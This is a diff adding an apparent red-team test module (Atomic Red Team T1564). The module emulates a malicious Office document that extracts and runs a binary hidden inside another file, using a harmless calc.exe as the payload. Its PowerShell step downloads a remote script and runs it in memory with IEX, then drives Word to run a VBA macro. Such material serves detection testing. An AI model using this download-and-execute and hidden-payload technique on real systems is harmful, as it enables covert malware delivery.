@@ -1,0 +1,97 @@
+{
+  "id": "6afe288a-8a8b-4d33-a629-8d03ba9dad3a",
+  "name": "Extract binary files via VBA",
+  "description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "8ab56f5e-17d3-4ef9-8386-64aec9f1ac61",
+      "type": "execute-command",
+      "data": {
+        "command": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\")\n$macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\"\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0c19de10-65cb-4c1c-b87a-68cc6df19f60",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item \"$env:TEMP\\extracted.exe\" -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "be6c7197-4646-45ca-adb9-4e27276595e0",
+      "name": "Check dependency 1/1",
+      "description": "Microsoft Word must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9698678d-ab73-4fed-b2ab-00d37967dc5b",
+      "name": "Resolve dependency 1/1",
+      "description": "Microsoft Word must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d8824c6b-5059-4de5-a00a-37f8060812d9",
+      "name": "Re-check dependency 1/1",
+      "description": "Microsoft Word must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "8ab56f5e-17d3-4ef9-8386-64aec9f1ac61",
+      "p": "on-success",
+      "o": "0c19de10-65cb-4c1c-b87a-68cc6df19f60"
+    },
+    {
+      "s": "8ab56f5e-17d3-4ef9-8386-64aec9f1ac61",
+      "p": "on-failure",
+      "o": "0c19de10-65cb-4c1c-b87a-68cc6df19f60"
+    },
+    {
+      "s": "be6c7197-4646-45ca-adb9-4e27276595e0",
+      "p": "on-success",
+      "o": "8ab56f5e-17d3-4ef9-8386-64aec9f1ac61"
+    },
+    {
+      "s": "be6c7197-4646-45ca-adb9-4e27276595e0",
+      "p": "on-failure",
+      "o": "9698678d-ab73-4fed-b2ab-00d37967dc5b"
+    },
+    {
+      "s": "9698678d-ab73-4fed-b2ab-00d37967dc5b",
+      "p": "on-success",
+      "o": "d8824c6b-5059-4de5-a00a-37f8060812d9"
+    },
+    {
+      "s": "d8824c6b-5059-4de5-a00a-37f8060812d9",
+      "p": "on-failure",
+      "o": "8ab56f5e-17d3-4ef9-8386-64aec9f1ac61"
+    }
+  ],
+  "tags": [
+    "T1564",
+    "atomic-red-team"
+  ]
+}
